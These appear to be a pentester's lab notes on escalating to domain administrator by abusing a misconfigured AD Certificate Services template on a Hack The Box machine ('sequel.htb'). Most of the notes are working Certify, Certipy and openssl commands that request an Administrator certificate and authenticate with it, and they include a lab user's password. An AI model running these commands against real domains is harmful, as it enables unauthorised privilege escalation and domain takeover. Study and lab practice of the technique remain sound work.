https://raxis.com/blog/ad-series-active-directory-certificate-services-adcs-misconfiguration-exploits/
##### Detection
User Group in *Certificate service DCOM access*.

---
## Method 1: Using Certify.exe
```cmd
.\Certify.exe find /vulnerable
```

![[Pasted image 20240330230448.png]]

Request certificate for another user (administrator)
```cmd
Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```

![[Pasted image 20240330230739.png]]
Make sure to copy the whole body (from BEGIN RSA PRIVATE KEY to END CERTIFICATE). In order to successfully convert it we must have the private key itself.
Copy it to Linux:
```sh
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Follow the next steps [here](https://systemweakness.com/exploiting-cve-2022-26923-by-abusing-active-directory-certificate-services-adcs-a511023e5366)



## Method 2: Using Certipy
```sh
certipy-ad req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -target-ip sequel.htb -ca 'sequel-DC-CA' -template UserAuthentication -upn 'administrator@sequel.htb'

certipy-ad auth -pfx administrator.pfx
# If error occurs, ntpdate -u dc.sequel.htb
```